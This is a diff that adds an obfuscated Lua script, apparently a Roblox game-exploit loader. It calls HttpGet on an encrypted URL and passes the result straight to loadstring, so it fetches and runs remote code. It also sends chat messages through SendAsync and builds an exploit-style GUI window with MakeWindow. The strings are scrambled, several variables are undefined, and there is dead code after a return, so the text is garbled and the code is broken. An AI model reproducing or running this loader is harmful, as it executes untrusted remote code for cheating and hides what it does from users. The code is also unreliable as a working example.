@@ -1,0 +1,75 @@
+local concat = table.concat
+local v62 = {}
+local char = string.char
+for index = 1, 256 do
+    char[index] = index 
+end
+local enable1 = #char == 0
+local removedVal = table.remove(char, math.random(1, #char))
+removedVal = #char
+local v5 = 0
+enable1 = removedVal == v5
+if enable1 then
+    local function function5(function4, function3, ...)
+        local tbl5 = function4
+        return tbl5.WaitForChild(tbl5, function3) 
+    end
+    
+    setmetatable({}, { ["__index"] = v32, ["__metatable"] = nil })
+    local v42 = _G
+    
+    local function function8(function7, function6, ...)
+        local tbl6 = function7
+        return tbl6.SendAsync(tbl6, function6) 
+    end
+    
+    local GAME = GAME
+    
+    local function function10(function9, ...)
+        local GAME2 = GAME
+        return GAME2.GetService(GAME2, function9) 
+    end
+    
+    local function function12(function11, ...) return loadstring(function11)() end
+    
+    function10 = function10("TwÄ\x1a±öæï9{]ÄÃÅwÏ8=")
+    enable1 = function10("s\x19-U\x16\x00¨¶Ä\x00\x10ò")["LoèË¸Ö(Z­\x19"]
+    local tbl2 = enable1["]Á\x10Ý\x05"]
+    local tbl = enable1["Ua5ËúôÒ#"]
+    local tbl4 = function10.WaitForChild(function10, "5l¯}èl_hÁbÈ\x0ea|w")
+    tbl4.WaitForChild(tbl4, "%\x14 ß4s\x17\\kF\x12")
+    local v12 = ")µOÐ;Ü>á"
+    tbl = L[P]
+    if tbl2["\x11{µ)ÖÑ4Àsr°"] and tbl[10994079340] then
+        v12 = "~8¡äÆà}"
+    else
+        local v22 = tbl2["\x01ü^@d0Õ§íx¶*Kö"]
+        if v22 and tbl[5240193892] then
+            v12 = "#â\x04\x15çÚ!"
+        else
+            v22 = tbl2
+            tbl = tbl2
+            if tbl2 then
+                v12 = "PUîyZ\x08òø\x0e1\r/"
+            else
+                return error(), false
+                local tbl3 = (function(function2, ...) return loadstring(function2)() end)((function(function1, ...)
+                    tbl = L[tbl4]
+                    return tbl.HttpGet(tbl, function1) 
+                end)("h*|±\x07ºá·eæUïvI\x11û/\x19m´ÂZ\x00Ä\x04½ào(ÑÍ\x19BÄtqÏLÇ:riÉLíãË¢ïEDYÐE\"]wØaùÃ¸2(ÃÆ<þ6\x1fbuã5á\x15\x1d n\x1cx\tDÍ\x13y"))
+                N.SendAsync(N, "F Û\x16y\x1ek ¹î\x16Ñ{pv]xÏ£]F\x05\x15¼èÜ²\x0bp/æ\n]\x05Ã\"\x0f÷ç\x05|Í\x10û Èío¬\x04Ö\x00\x11r°¹ËG*÷Ô\x00ab")
+                tbl3.MakeWindow(tbl3, tbl3, {
+                    ["N¬Ù¸5Ó"] = "B&\x1c\x0eS|\x06gR?÷",
+                    ["FreOºhà\x05´\x06Zj"] = true,
+                    ["H#\x01^¾\x0f*\"º8\x19À\x16d"] = true,
+                    [",pb¸(ï?¬ÿZÜ\x1ca\x194f6"] = true,
+                    ["\x18ä\x14-³ñ­Ä/c"] = "Cw×\x19¤Ý¼\x14R`Õ\x0b\x14êT\x1bÊgÁòñæ",
+                    ["%(Wv\\B4ñÚ\\U÷ª¤³"] = "r1Îp\x07fã\x0b¼\x08v»sD\\û¶Z+\x1aÊ\x04ôï\x18°¹vy­õµf1",
+                    ["KrLáÃ\x02-x\x13Á?6#^ÕZÏLç¬ír"] = "M-",
+                    ["SaveCX\x13ö.¾ÿ\"ú"] = true,
+                    ["Có´\x15Ë¿_EÙÅÔÓì"] = ":Ry\x1frÍ«Ä\x14\x0f\x0fÈoü1Þì"
+                })
+            end
+        end
+    end
+end
